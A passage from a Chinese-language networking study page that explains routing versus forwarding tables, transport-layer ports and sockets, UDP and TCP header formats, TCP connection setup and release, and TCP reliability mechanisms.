</tr>
<tr>
<td style="text-align:center">0.0.0.0</td>
<td style="text-align:center">0.0.0.0</td>
<td style="text-align:center">202.114.2.2</td>
<td style="text-align:center">L0</td>
</tr>
</tbody>
</table>
<p>转发表是从路由表得出的，其表项和路由表项有直接的对应关系。但转发表的格式和路由表的格式不同，其结构应使查找过程最优化（而路由表则需对网络拓扑变化的计算最优化）。转发表中含有一个分组将要发往的目的地址，以及分组的下一跳（即下一步接收者的目的地址，实际为 MAC 地址）。为了减少转发表的重复项目，可以使用一个默认路由代替所有具有相同 “下一跳” 的项目，并将默认路由设置得比其他项目的优先级低。路由表总是用软件来实现的；转发表可以用软件来实现，甚至也可以用特殊的硬件来实现。</p>
<p><strong>转发和路由选择的区别</strong>：“转发” 是路由器根据转发表把收到的 IP 数据报从合适的端口转发出去，它仅涉及一个路由器。而 “路由选择” 则涉及很多路由器，路由表是许多路由器协同工作的结果。这些路由器按照复杂的路由算法，根据从各相邻路由器得到的关于网络拓扑的变化情况，动态地改变所选择的路由，并由此构造出整个路由表。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>在讨论路由选择的原理时，往往不去区分转发表和路由表的区别，但要注意路由表不等于转发表。分组的实际转发是靠直接查找转发表，而不是直接查找路由表</p>
</div>
<h2> 传输层</h2>
<h3> 传输层提供的服务</h3>
<h4> 传输层的功能</h4>
<p>从通信和信息处理的角度看，传输层向它上面的应用层提供通信服务，它属于面向通信部分的最高层，同时也是用户功能中的最低层。</p>
<p>传输层位于网络层之上，它为运行在不同主机上的进程之间提供了逻辑通信，而网络层提供主机之间的逻辑通信。显然，即使网络层协议不可靠（网络层协议使分组丢失、混乱或重复），传输层同样能为应用程序提供可靠的服务。</p>
<p>例如：网络的边缘部分的两台主机使用网络核心部分的功能进行端到端的通信时，只有主机的协议栈才有传输层和应用层，而路由器在转发分组时都只用到下三层的功能（即在通信子网中没有传输层，传输层只存在于通信子网以外的主机中）。</p>
<p><strong>传输层的功能如下：</strong></p>
<ul>
<li>
<p>传输层提供应用进程之间的逻辑通信（即端到端的通信）。与网络层的区别是，网络层提供的是主机之间的逻辑通信</p>
<p>从网络层来说，通信的双方是两台主机，IP 数据报的首部给出了这两台主机的 IP 地址。但 “两台主机之间的通信” 实际上是两台主机中的应用进程之间的通信，<strong>应用进程之间的通信又称端到端的逻辑通信</strong>。这里 “逻辑通信” 的意思是：传输层之间的通信好像是沿水平方向传送数据，但事实上这两个传输层之间并没有一条水平方向的物理连接。</p>
</li>
<li>
<p>复用和分用。复用是指发送方不同的应用进程都可使用同一个传输层协议传送数据；分用是指接收方的传输层在剥去报文的首部后能够把这些数据正确交付到目的应用进程</p>
<div class="hint-container info">
<p class="hint-container-title">相关信息</p>
<p>网络层也有复用分用的功能，但网络层的复用是指发送方不同协议的数据都可以封装成 IP 数据报发送出去，分用是指接收方的网络层在剥去首部后把数据交付给相应的协议</p>
</div>
</li>
<li>
<p>传输层还要对收到的报文进行差错检测（首部和数据部分）。而网络层只检查 IP 数据报的首部，不检验数据部分是否出错</p>
</li>
<li>
<p>提供两种不同的传输协议，即面向连接的 TCP 和无连接的 UDP。而网络层无法同时实现两种协议（即在网络层要么只提供面向连接的服务，如：虚电路；要么只提供无连接服务，如：数据报，而不可能在网络层同时存在这两种方式）</p>
</li>
</ul>
<p>传输层向高层用户屏蔽了低层网络核心的细节（如：网络拓扑、路由协议等），它使应用进程看见的是在两个传输层实体之间好像有一条端到端的逻辑通信信道，这条逻辑通信信道对上层的表现却因传输层协议不同而有很大的差别。当传输层采用面向连接的 TCP 时，尽管下面的网络是不可靠的（只提供尽最大努力的服务），但这种逻辑通信信道就相当于一条全双工的可靠信道。但当传输层采用无连接的 UDP 时，这种逻辑通信信道仍然是一条不可靠信道。</p>
<h4> 传输层的寻址与端口</h4>
<ol>
<li>
<p><strong>端口的作用</strong></p>
<p>端口能够让应用层的各种应用进程将其数据通过端口向下交付给传输层，以及让传输层知道应当将其报文段中的数据向上通过端口交付给应用层相应的进程。端口是传输层服务访问点（TSAP），它在传输层的作用类似于 IP 地址在网络层的作用或 MAC 地址在数据链路层的作用，只不过 IP 地址和 MAC 地址标识的是主机，而端口标识的是主机中的应用进程。</p>
<p>数据链路层的 SAP 是 MAC 地址，网络层的 SAP 是 IP 地址，传输层的 SAP 是端口。</p>
<p>在协议栈层间的抽象的协议端口是软件端口，它与路由器或交换机上的硬件端口是完全不同的概念。硬件端口是不同硬件设备进行交互的接口，而软件端口是应用层的各种协议进程与传输实体进行层间交互的一种地址。传输层使用的是软件端口。</p>
</li>
<li>
<p><strong>端口号</strong></p>
<p>应用进程通过端口号进行标识，端口号长度为 <code>16bit</code>，能够表示 <code>65536</code>（2<sup>16</sup>） 个不同的端口号。端口号只具有本地意义，即端口号只标识本计算机应用层中的各进程，在因特网中不同计算机的相同端口号是没有联系的。<strong>根据端口号范围可将端口分为两类：</strong></p>
<ul>
<li>服务器端使用的端口号。它又分为两类，最重要的一类是 <strong>熟知端口号</strong>，数值为 <code>0~1023</code>，IANA（互联网地址指派机构）把这些端口号指派给了 TCP/IP 最重要的一些应用程序，让所有的用户都知道。另一类称为 <strong>登记端口号</strong>，数值为 <code>1024~49151</code>。它是供没有熟知端口号的应用程序使用的，使用这类端口号必须在 IANA 登记，以防止重复。</li>
</ul>
<p><strong>一些常用的熟知端口号如下：</strong></p>
<table>
<thead>
<tr>
<th style="text-align:center">应用程序</th>
<th style="text-align:center">FTP</th>
<th style="text-align:center">TELNET</th>
<th style="text-align:center">SMTP</th>
<th style="text-align:center">DNS</th>
<th style="text-align:center">TFTP</th>
<th style="text-align:center">HTTP</th>
<th style="text-align:center">SNMP</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">熟知端口号</td>
<td style="text-align:center">21</td>
<td style="text-align:center">23</td>
<td style="text-align:center">25</td>
<td style="text-align:center">53</td>
<td style="text-align:center">69</td>
<td style="text-align:center">80</td>
<td style="text-align:center">161</td>
</tr>
</tbody>
</table>
<ul>
<li>客户端使用的端口号，数值为 <code>49152~65535</code>。由于这类端口号仅在客户进程运行时才动态地选择，因此又称短暂端口号（也称临时端口）。通信结束后，刚用过的客户端口号就不复存在，从而这个端口号就可供其他客户进程以后使用。</li>
</ul>
</li>
<li>
<p><strong>套接字</strong></p>
<p>在网络中通过 IP 地址来标识和区别不同的主机，通过端口号来标识和区分一台主机中的不同应用进程，端口号拼接到 IP 地址即构成套接字 Socket。在网络中采用发送方和接收方的套接字来识别端点。套接字，实际上是一个通信端点，即：套接字 Socket =（IP 地址：端口号）它唯一地标识网络中的一台主机和其上的一个应用（进程）。</p>
<p>在网络通信中，主机 <code>A</code> 发给主机 <code>B</code> 的报文段包含目的端口号和源端口号，源端口号是 “返回地址” 的一部分，即当 <code>B</code> 需要发回一个报文段给 <code>A</code> 时，<code>B</code> 到 <code>A</code> 的报文段中的目的端口号便是 <code>A</code> 到 <code>B</code> 的报文段中的源端口号（完全的返回地址是 <code>A</code> 的 IP 地址和源端口号）。</p>
</li>
</ol>
<h4> 无连接服务与面向连接服务</h4>
<p>面向连接服务就是在通信双方进行通信之前，必须先建立连接，在通信过程中，整个连接的情况一直被实时地监控和管理。通信结束后，应该释放这个连接。</p>
<p>无连接服务是指两个实体之间的通信不需要先建立好连接，需要通信时，直接将信息发送到 “网络” 中，让该信息的传递在网上尽力而为地往目的地传送。</p>
<p><strong>TCP/IP 协议族在 IP 层之上使用了两个传输协议</strong>：一个是面向连接的传输控制协议（TCP），采用 TCP 时，传输层向上提供的是一条全双工的可靠逻辑信道；另一个是无连接的用户数据报协议（UDP），采用 UDP 时，传输层向上提供的是一条不可靠的逻辑信道。</p>
<p>TCP 提供面向连接的服务，在传送数据之前必须先建立连接，数据传送结束后要释放连接。TCP 不提供广播或组播服务。由于 TCP 提供面向连接的可靠传输服务，因此不可避免地增加了许多开销，如：确认、流量控制、计时器及连接管理等。这不仅使协议数据单元的头部增大很多，还要占用许多的处理机资源。因此 TCP 主要适用于可靠性更重要的场合，如：文件传输协议（FTP）、超文本传输协议（HTTP）、远程登录（TELNET）等。</p>
<p>UDP 是一个无连接的非可靠传输层协议。它在 IP 之上仅提供两个附加服务：多路复用和对数据的错误检查。IP 知道怎样把分组投递给一台主机，但不知道怎样把它们投递给主机上的具体应用。UDP 在传送数据之前不需要先建立连接，远程主机的传输层收到 UDP 报文后，不需要给出任何确认。由于 UDP 比较简单，因此执行速度比较快、实时性好。使用 UDP 的应用主要包括小文件传送协议（TFTP）、DNS、SNMP 和实时传输协议（RTP）。</p>
<div class="hint-container tip">
<p class="hint-container-title">IP 数据报和 UDP 数据报的区别</p>
<p>IP 数据报在网络层要经过路由的存储转发；而 UDP 数据报在传输层的端到端的逻辑信道中传输，封装成 IP 数据报在网络层传输时，UDP 数据报的信息对路由是不可见的</p>
</div>
<div class="hint-container tip">
<p class="hint-container-title">TCP 和网络层虚电路的区别</p>
<p>TCP 报文段在传输层抽象的逻辑信道中传输，对路由器不可见；虚电路所经过的交换结点都必须保存虚电路状态信息。在网络层若采用虚电路方式，则无法提供无连接服务；而传输层采用 TCP 不影响网络层提供无连接服务</p>
</div>
<h3> UDP 协议</h3>
<h4> UDP 数据报</h4>
<ol>
<li>
<p><strong>UDP 概述</strong></p>
<p>UDP 仅在 IP 的数据报服务之上增加了两个最基本的服务：复用和分用以及差错检测。如果应用开发者选择 UDP 而非 TCP，那么应用程序几乎直接与 IP 打交道。为什么应用开发者宁愿在 UDP 之上构建应用，也不选择 TCP？既然 TCP 提供可靠的服务，而 UDP 不提供，那么 TCP 总是首选吗？答案是否定的，因为有很多应用更适合用 UDP，主要因为 <strong>UDP 具有如下优点：</strong></p>
<ul>
<li><strong>UDP 无须建立连接</strong>。因此 UDP 不会引入建立连接的时延。试想如果 DNS 运行在 TCP 而非 UDP 上，那么 DNS 的速度会慢很多。HTTP 使用 TCP 而非 UDP，是因为对于基于文本数据的 Web 网页来说，可靠性是至关重要的</li>
<li><strong>无连接状态</strong>。TCP 需要在端系统中维护连接状态。此连接状态包括接收和发送缓存、拥塞控制参数和序号与确认号的参数。而 UDP 不维护连接状态，也不跟踪这些参数。因此，某些专用应用服务器使用 UDP 时，一般都能支持更多的活动客户机</li>
<li><strong>分组首部开销小</strong>。TCP 有 <code>20B</code> 的首部开销，而 UDP 仅有 <code>8B</code> 的开销</li>
<li><strong>应用层能更好地控制要发送的数据和发送时间</strong>。UDP 没有拥塞控制，因此网络中的拥塞不会影响主机的发送效率。某些实时应用要求以稳定的速度发送；能容忍一些数据的丢失，但不充许有较关的时延，而 UDP 正好满足这些应用的需求</li>
<li><strong>UDP 支持一对一、一对多、多对一和多对多的交互通信</strong></li>
</ul>
<p>UDP 常用于一次性传输较少数据的网络应用，如：DNS、SNMP 等，因为对于这些应用，若采用 TCP，则将为连接创建、维护和拆除带米不小的开销。UDP 也常用于多媒体应用（如：IP 电话、实时视频会议、流媒体等），显然，可靠数据传输对这些应用来说并不是最重要的，但 TCP 的拥塞控制会导致数据出现较大的延迟，这是它们不可容忍的。</p>
<p>UDP 不保证可靠交付，但这并不意味着应用对数据的要求是不可靠的，所有维护可靠性的工作可由用户在应用层来完成。应用开发者可根据应用的需求来灵活设计自己的可靠性机制。</p>
<p>UDP 是面向报文的。发送方 UDP 对应用层交下来的报文，在添加首部后就向下交付给 IP 层，一次发送一个报文，既不合并，也不拆分，而是保留这些报文的边界；接收方 UDP 对 IP 层交上来 UDP 数据报，在去除首部后就原封不动地交付给上层应用进程，一次交付一个完整的报文。因此报文不可分割，是 UDP 数据报处理的最小单位。因此，应用程序必须选择合适大小的报文，若报文太长，UDP 把它交给 IP 层后，可能会导致分片；若报文太短，UDP 把它交给 IP 层后，会使 IP 数据报的首部的相对长度太大，两者都会降低 IP 层的效率。</p>
</li>
<li>
<p><strong>UDP 的首部格式</strong></p>
<p>UDP 数据报包含两部分：UDP 首部和用户数据。UDP 首部有 <code>8B</code>，由 <code>4</code> 个字段组成，每个字段的长度都是 <code>2B</code>。各字段意义如下：</p>
<ul>
<li><strong>源端口</strong>：源端口号。在需要对方回信时选用，不需要时可用全 <code>0</code></li>
<li><strong>目的端口</strong>：目的端口号。这在终点交付报文时必须使用到</li>
<li><strong>长度</strong>：UDP 数据报的长度（包括首部和数据），其最小值是 <code>8</code>（仅有首部）</li>
<li><strong>校验和</strong>：检测 UDP 数据报在传输中是否有错。有错就丢弃。该字段是可选的，当源主机，不想计算校验和时，则直接令该字段为全 <code>0</code></li>
</ul>
<p>当传输层从 IP 层收到 UDP 数据报时，就根据首部中的目的端口，把 UDP 数据报通过相应的端口上交给应用进程。</p>
<p>如果接收方 UDP 发现收到的报文中的目的端口号不正确（即不存在对应于端口号的应用进程），那么就丢弃该报文，并由 ICMP 发送 “端口不可达” 差错报文给发送方。</p>
</li>
</ol>
<h4> UDP 校验</h4>
<p>在计算校验和时，要在 UDP 数据报之前增加 <code>12B</code> 的伪首部，伪首部并不是 UDP 的真正首部。只是在计算校验和时，临时添加在 UDP 数据报的前面，得到一个临时的 UDP 数据报。校验和就是按照这个临时的 UDP 数据报来计算的。伪首部既不向下传送又不向上递交，而只是为了计算校验和。</p>
<p>UDP 校验和的计算方法和 IP 数据报首部校验和的计算方法相似。但不同的是，IP 数据报的校验和只检验 IP 数据报的首部，但 UDP 的校验和则检查首部和数据部分。</p>
<p>发送方首先把全零放入校验和字段并添加伪首部，然后把 UDP 数据报视为许多 <code>16</code> 位的字串接起来。若 UDP 数据报的数据部分不是偶数个字节，则要在数据部分末尾填入一个全零字节（但此字节不发送）。然后按二进制反码计算出这些 <code>16</code> 位字的和，将此和的二进制反码写入校验和字段，并发送。接收方把收到的 UDP 数据报加上伪首部（如果不为偶数个字节，那么还需要补上全零字节）后，按二进制反码求这些 <code>16</code> 位字的和。当无差错时其结果应为全 <code>1</code>，否则就表明有差错出现，接收方就应该丢弃这个 UDP 数据报。</p>
<p>这种简单的差错校验方法的校错能力并不强，但它的好处是简单、处理速度快。</p>
<h3> TCP 协议</h3>
<h4> TCP 协议的特点</h4>
<p>TCP 是在不可靠的 IP 层之上实现的可靠的数据传输协议，它主要解决传输的可靠、有序、无丢失和不重复问题。TCP 是 TCP/IP 体系中非常复杂的一个协议，<strong>主要特点如下：</strong></p>
<ul>
<li>
<p>TCP 是面向连接的传输层协议，TCP 连接是一条逻辑连接</p>
</li>
<li>
<p>每一条 TCP 连接只能有两个端点，每一条 TCP 连接只能是点到点的（一对一）</p>
</li>
<li>
<p>TCP 提供可靠交付的服务，保证传送的数据无差错、不丢失、不重复且有序</p>
</li>
<li>
<p>TCP 提供全双工通信，允许通信双方的应用进程在任何时候都能发送数据，为此 TCP 连接的两端都设有发送缓存和接收缓存，用来临时存放双向通信的数据</p>
<ul>
<li><strong>发送缓存用来暂时存放的数据</strong>：发送应用程序传送给发送方 TCP 准备发送的数据；TCP 已发送但尚未收到确认的数据</li>
<li><strong>接收缓存用来暂时存放的数据</strong>：按序到达但尚未被接收应用程序读取的数据；不按序到达的数据</li>
</ul>
</li>
<li>
<p>TCP 是面向字节流的，虽然应用程序和 TCP 的交互是一次一个数据块（大小不等），但 TCP 把应用程序交下来的数据仅视为一连串的无结构的字节流</p>
</li>
</ul>
<p>TCP 和 UDP 在发送报文时所采用的方式完全不同。UDP 报文的长度由发送应用进程决定，而 TCP 报文的长度则根据接收方给出的窗口值和当前网络拥塞程度来决定。如果应用进程传送到 TCP 缓存的数据块太长，TCP 就把它划分得短一些再传送；如果太短，TCP 也可以等到积累足够多的字节后再构成报文段发送出去。</p>
<h4> TCP 报文段</h4>
<p><strong>TCP 传送的数据单元称为报文段</strong>。TCP 报文段既可以用来运载数据，又可以用来建立连接、释放连接和应答。一个 TCP 报文段分为首部和数据两部分，整个 TCP 报文段作为 IP 数据报的数据部分封装在 IP 数据报中。其首部的前 <code>20B</code> 是固定的。TCP 首部最短为 <code>20B</code>，后面有 <code>4N</code> 字节是根据需要而增加的选项，长度为 <code>4B</code> 的整数倍。</p>
<p>TCP 的全部功能体现在其首部的各个字段中，<strong>各字段意义如下：</strong></p>
<ul>
<li><strong>源端口和目的端口</strong>：各占 <code>2B</code>。端口是传输层与应用层的服务接口，传输层的复用和分用功能都要通过端口实现</li>
<li><strong>序号</strong>：占 <code>4B</code>，范围为 0~2<sup>32</sup> - 1，共 2<sup>32</sup> 个序号。TCP 是面向字节流的（即 TCP 传送时是逐个字节传送的），所以 TCP 连接传送的字节流中的每个字节都按顺序编号。序号字段的值指的是本报文段所发送的数据的第一个字节的序号。例如：一报文段的序号字段值是 <code>301</code>，而携带的数据共有 <code>100B</code>，表明本报文段的数据的最后一个字节的序号是 <code>400</code>，因此下一个报文段的数据序号应从 <code>401</code> 开始</li>
<li><strong>确认号</strong>：占 <code>4B</code>，是期望收到对方下一个报文段的第一个数据字节的序号。若确认号为 <code>N</code>，则表明到序号 <code>N - 1</code> 为止的所有数据都已正确收到。例如：<code>B</code> 正确收到了 <code>A</code> 发送过来的一个报文段，其序号字段是 <code>501</code>，而数据长度是 <code>200B</code>（序号 <code>501~700</code>），这表明 <code>B</code> 正确收到了 <code>A</code> 发送的到序号 <code>700</code> 为止的数据。因此 <code>B</code> 期望收到 <code>A</code> 的下一个数据序号是 <code>701</code>，于是 <code>B</code> 在发送给 <code>A</code> 的确认报文段中把确认号置为 <code>701</code></li>
<li><strong>数据偏移（即首部长度）</strong>。占 <code>4</code> 位，这里不是 IP 数据报分片的那个数据偏移，而是表示首部长度（首部中还有长度不确定的选项字段）它指出 TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远。“数据偏移” 的单位是 <code>32</code> 位（以 <code>4B</code> 为计算单位）。由于 <code>4</code> 位二进制数能表示的最大值为 <code>15</code>，因此 TCP 首部的最大长度为 <code>60B</code></li>
<li><strong>保留</strong>：占6位，保留为今后使用，但目前应置为0。</li>
<li><strong>紧急位 URG</strong>：当 <code>URG = 1</code> 时，表明紧急指针字段有效。它告诉系统此报文段中有紧急数据，应尽快传送（相当于高优先级的数据。但 URG 需要和首部中紧急指针字段配合使用，即数据从第一个字节到紧急指针所指字节就是紧急数据</li>
<li><strong>确认位 ACK</strong>：仅当 <code>ACK = 1</code> 时确认号字段才有效。当 <code>ACK = 0</code> 时，确认号无效。TCP 规定，在连接建立后所有传送的报文段都必须把 ACK 置 <code>1</code></li>
<li><strong>推送位 PSH（Push）</strong>：接收方 TCP 收到 <code>PSH = 1</code> 的报文段，就尽快地交付给接收应用进程，而不再等到整个缓存都填满了后再向上交付</li>
<li><strong>复位位 RST（Reset）</strong>：当 <code>RST = 1</code> 时，表明 TCP 连接中出现严重差错（如：主机崩溃或其他原因），必须释放连接，然后再重新建立运输连接</li>
<li><strong>同步位 SYN</strong>：当 <code>SYN = 1</code> 时表示这是一个连接请求或连接接受报文。当 <code>SYN = 1, ACK = 0</code> 时，表明这是一个连接请求报文，对方若同意建立连接，则应在响应报文中使用 <code>SYN = 1, ACK = 1</code></li>
<li><strong>终止位 FIN（Finish）</strong>：用来释放一个连接。当 <code>FIN = 1</code> 时，表明此报文段的发送方的数据已发送完毕，并要求释放运输连接</li>
<li><strong>窗口</strong>：占 <code>2B</code>，范围为 0~2<sup>16</sup> - 1。它指出现在允许对方发送的数据量，接收方的数据缓存空间是有限的，因此用窗口值作为接收方让发送方设置其发送窗口的依据。例如：设确认号是 <code>701</code>，窗口字段是 <code>1000</code>。这表明，从 <code>701</code> 号算起，发送此报文段的一方还有接收 <code>1000</code> 字节数据（字节序号为 <code>701~1700</code>）的接收缓存空间</li>
<li><strong>校验和</strong>：占 <code>2B</code>。校验和字段检验的范围包括首部和数据两部分。在计算校验和时，和 UDP 一样，要在 TCP 报文段的前面加上 <code>12B</code> 的伪首部（只需将 UDP 伪首部的协议字段的 <code>17</code> 改成 <code>6</code>、UDP 长度字段改成 TCP 长度，其他的和 UDP 一样）</li>
<li><strong>紧急指针</strong>：占 <code>2B</code>。紧急指针仅在 <code>URG = 1</code> 时才有意义，它指出在本报文段中紧急数据共有多少字节（紧急数据在报文段数据的最前面）</li>
<li><strong>选项</strong>：长度可变。TCP 最初只规定了一种选项，即最大报文段长度（Maximum Segment Size，MSS）。MSS 是 TCP 报文段中的数据字段的最大长度（注意仅仅是数据字段）</li>
<li><strong>填充</strong>：这是为了使整个首部长度是 <code>4B</code> 的整数倍</li>
</ul>
<h4> TCP 连接管理</h4>
<p>TCP 是面向连接的协议，因此每个 TCP 连接都有三个阶段：连接建立、数据传送和连接释放。TCP 连接的管理就是 <strong>使运输连接的建立和释放都能正常进行。</strong></p>
<p>在 TCP 连接建立的过程中，<strong>要解决以下三个问题：</strong></p>
<ul>
<li>要使每一方能够确知对方的存在</li>
<li>要允许双方协商一些参数（如：最大窗口值、是否使用窗口扩大选项、时间戳选项及服务质量等）</li>
<li>能够对运输实体资源（如：缓存大小、连接表中的项目等）进行分配</li>
</ul>
<p>TCP 把连接作为最基本的抽象，每条 TCP 连接有两个端点，TCP 连接的端点不是主机，不是主机的 IP 地址,不是应用进程，也不是传输层的协议端口。<strong>TCP 连接的端口即为套接字（Socket）或插口</strong>，每条 TCP 连接唯一地被通信的两个端点（即两个套接字）确定。</p>
<p><strong>TCP 连接的建立采用客户/服务器模式</strong>。主动发起连接建立的应用进程称为客户（Client），而被动等待连接建立的应用进程称为服务器（Server）。</p>
<ol>
<li>
<p><strong>TCP 连接的建立</strong></p>
<p>连接的建立经历以下三个步骤，通常称为 <strong>三次握手</strong>，如下图所示：</p>
<figure><figcaption>TCP 连接</figcaption></figure>
<p>连接建立前，服务器进程处于 <code>LISTEN</code>（收听）状态，等待客户的连接请求。</p>
<ul>
<li><strong>第一步</strong>：客户机的 TCP 首先向服务器的 TCP 发送连接请求报文段。这个特殊报文段的首部中的同步位 SYN 置 <code>1</code>，同时选择一个初始序号 <code>seq = x</code>。TCP 规定，SYN 报文段不能携带数据，但要消耗掉一个序号。这时，TCP 客户进程进入 <strong>SYN-SENT（同步已发送）状态</strong></li>
<li><strong>第二步</strong>：服务器的 TCP 收到连接请求报文段后，如同意建立连接，则向客户机发回确认，并为该 TCP 连接分配缓存和变量。在确认报文段中，把 SYN 位和 ACK 位都置 <code>1</code>，确认号是 <code>ack = x + 1</code>，同时也为自已选择一个初始序号 <code>seq = y</code>。注意，确认报文段不能携带数据，但也要消耗掉一个序号。这时，TCP 服务器进程进入 <strong>SYN-RCVD（同步收到）状态</strong></li>
<li><strong>第三步</strong>：当客户机收到确认报文段后，还要向服务器给出确认，并为该 TCP 连接分配缓存和变量。确认报文段的 ACK 位置 <code>1</code>，确认号 <code>ack = y + 1</code>，序号 <code>seq = x + 1</code>。该报文段可以携带数据，若不携带数据则不消耗序号。这时，TCP 客户进程进入 <strong>ESTABLISHED（已建立连接）状态</strong></li>
</ul>
<p>成功进行以上三步后，就建立了 TCP 连接，接下来就可以传送应用层数据。TCP 提供的是全双工通信，因此通信双方的应用进程在任何时候都能发送数据。</p>
<p>另外，值得注意的是，服务器端的资源是在完成第二次握手时分配的，而客户端的资源是在完成第三次握手时分配的，这就使得服务器易于受到 SYN 洪泛攻击。</p>
</li>
<li>
<p><strong>TCP 连接的释放</strong></p>
<p>参与 TCP 连接的两个进程中的任何一个都能终止该连接。TCP 连接释放的过程通靠称为 <strong>四次握手</strong>，如下图所示：</p>
<figure><figcaption>TCP 释放</figcaption></figure>
<ul>
<li><strong>第一步</strong>：客户机打算关闭连接时，向其 TCP 发送连接释放报文段，并停止发送数据，主动关闭 TCP 连接，该报文段的终止位 FIN 置 <code>1</code>，序号 <code>seq = u</code>，它等于前面已传送过的数据的最后一个字节的序号加 <code>1</code>，FIN 报文段即使不携带数据，也消耗掉一个序号。这时，TCP 客户进程进入 <strong>FIN-WAIT-1（终止等待 <code>1</code>）状态</strong>。TCP 是全双工的，即可以想象为一条 TCP 连接上有两条数据通路，发送 FIN 的一端不能再发送数据，即关闭了其中一条数据通路，但对方还可以发送数据</li>
<li><strong>第二步</strong>：服务器收到连接释放报文段后即发出确认，确认号 <code>ack = u + 1</code>，序号 <code>seq = v</code>，等于它前面已传送过的数据的最后一个字节的序号加 <code>1</code>。然后服务器进入 <strong>CLOSE-WAIT（关闭等待）状态</strong>。此时，从客户机到服务器这个方向的连接就释放了，TCP 连接处于半关闭状态。但服务器若发送数据，客户机仍要接收，即从服务器到客户机这个方向的连接并未关闭</li>
<li><strong>第三步</strong>：若服务器已经没有要向客户机发送的数据，就通知 TCP 释放连接，此时，其发出 <code>FIN = 1</code> 的连接释放报文段。设该报文段的序号为 <code>W</code>（在半关闭状态服务器可能又发送了一些数据），还须重复上次已发送的确认号 <code>ack = u + 1</code>。这时服务器进入 <strong>LAST-ACK（最后确认）状态</strong></li>
<li><strong>第四步</strong>：客户机收到连接释放报文段后，必须发出确认。把确认报文段中的确认位 ACK 置 <code>1</code>，确认号 <code>ack = w + 1</code>，序号 <code>seq = u + 1</code>。此时 TCP 连接还未释放，必须经过时间等待计时器设置的时间 <code>2MSL</code>（最长报文段寿命）后，客户机才进入 <strong>CLOSED（连接关闭）状态</strong></li>
</ul>
</li>
</ol>
<p><strong>TCP 连接建立和释放的总结如下：</strong></p>
<ul>
<li>
<p><strong>连接建立。分为三步：</strong></p>
<ul>
<li>SYN = 1, seq = x</li>
<li>SYN = 1, ACK = l, seq = y, ack = x + 1</li>
<li>ACK = 1, seq = x + 1, ack = y + 1</li>
</ul>
</li>
<li>
<p><strong>释放连接。分为四步：</strong></p>
<ul>
<li>FIN = l, seq = u</li>
<li>ACK = 1, seq = v, ack = u + 1</li>
<li>FIN = 1, ACK = l, seq = w, ack = u + 1</li>
<li>ACK = 1, seq = u + 1, ack = w + 1</li>
</ul>
</li>
</ul>
<h4> TCP 可靠传输</h4>
<p>TCP 的任务是在 IP 层不可靠的、尽力而为服务的基础上建立一种可靠数据传输服务。TCP 提供的可靠数据传输服务保证接收方进程从缓存区读出的字节流与发送方发出的字节流完全一样。TCP 使用了校验、序号、确认和重传等机制来达到这一目的。其中，TCP 的校验机制与 UDP 校验一样。</p>
<ol>
<li>
<p><strong>序号</strong></p>
<p>TCP 首部的序号字段 <strong>用来保证数据能有序提交给应用层</strong>，TCP 把数据视为一个无结构但有序的字节流，序号建立在传送的字节流之上，而不建立在报文段之上。</p>
<p>TCP 连接传送的数据流中的每个字节都编上一个序号。序号字段的值是指本报文段所发送的数据的第一个字节的序号。假设 <code>A</code> 和 <code>B</code> 之间建立了一条 TCP 连接，<code>A</code> 的发送缓存区中共有 <code>10B</code>，序号从 <code>0</code> 开始标号，第一个报文包含第 <code>0~2</code> 个字节，则该 TCP 报文段的序号是 <code>0</code>，第二个报文段的序号是 <code>3</code>。</p>
</li>
<li>
<p><strong>确认</strong></p>
<p>TCP 首部的确认号是 <strong>期望收到对方的下一个报文段的数据的第一个字节的序号</strong>。如果接收方 <code>B</code> 已收到第一个报文段，此时 <code>B</code> 希望收到的下一个报文段的数据是从第 <code>3</code> 个字节开始的，那么 <code>B</code> 发送给 <code>A</code> 的报文中的确认号字段应为 <code>3</code>。发送方缓存区会继续存储那些已发送但未收到确认的报文段，以便在需要时重传。</p>
<p>TCP 默认使用累积确认，即 TCP 只确认数据流中至第一个丢失字节为止的字节。如果接收方 <code>B</code> 收到了 <code>A</code> 发送的包含字节 <code>0~2</code> 及字节 <code>6~7</code> 的报文段。由于某种原因，<code>B</code> 还未收到字节 <code>3~5</code> 的报文段，此时 <code>B</code> 仍在等待字节 <code>3</code>（和其后面的字节），因此 <code>B</code> 到 <code>A</code> 的下一个报文段将确认号字段置为 <code>3</code>。</p>
</li>
<li>
<p><strong>重传</strong></p>
<p>有两种事件会导致 TCP 对报文段进行重传：超时和冗余 ACK。</p>
<ul>
<li>
<p><strong>超时</strong></p>
<p>TCP 每发送一个报文段，就对这个报文段设置一次计时器。计时器设置的重传时间到期但还未收到确认时，就要重传这一报文段。</p>
<p>由于 TCP 的下层是一个互联网环境，IP 数据报所选择的路由变化很大，因而传输层的往返时延的方差也很大。为了计算超时计时器的重传时间，TCP 采用一种自适应算法，它记录一个报文段发出的时间，以及收到相应确认的时间，这两个时间之差称为报文段的 <strong>往返时间（Round-Trip Time，RTT）</strong>。TCP 保留了 RTT 的一个加权平均往返时间 RTT<sub>s</sub>，它会随新测量 RTT 样本值的变化而变化。显然，超时计时器设置的 <strong>超时重传时间（Retransmission Time-Out，RTO）</strong> 应略大于 RTT<sub>s</sub>，但也不能大太多，否则当报文段丢失时，TCP 不能很快重传，导致数据传输时延大。</p>
</li>
<li>
<p><strong>冗余 ACK（冗余确认）</strong></p>
<p>超时触发重传存在的一个问题是超时周期往往太长。所幸的是，发送方通常可在超时事件发生之前通过注意所谓的冗余 ACK 来较好地检测丢包情况。冗余 ACK 就是再次确认某个报文段的 ACK，而发送方先前已经收到过该报文段的确认。例如：发送方 <code>A</code> 发送了序号为 <code>1、2、3、4、5</code> 的 TCP 报文段，其中 <code>2</code> 号报文段在链路中丢失，它无法到达接收方 <code>B</code>。因此 <code>3、4、5</code> 号报文段对于 <code>B</code> 来说就成了失序报文段。TCP 规定每当比期望序号大的失序报文段到达时，就发送一个冗余 ACK，指明下一个期待字节的序号。在本例中，<code>3、4、5</code> 号报文到达 <code>B</code>，但它们不是 <code>B</code> 所期望收到的下一个报文，于是 <code>B</code> 就发送 <code>3</code> 个对 <code>1</code> 号报文段的冗余 ACK，表示自己期望接收 <code>2</code> 号报文段。TCP 规定当发送方收到对同一个报文段的 <code>3</code> 个冗余 ACK 时，就可以认为跟在这个被确认报文段之后的报文段已经丢失。就前面的例子而言，当 <code>A</code> 收到对于 <code>1</code> 号报文段的 <code>3</code> 个冗余 ACK 时，它可以认为 <code>2</code> 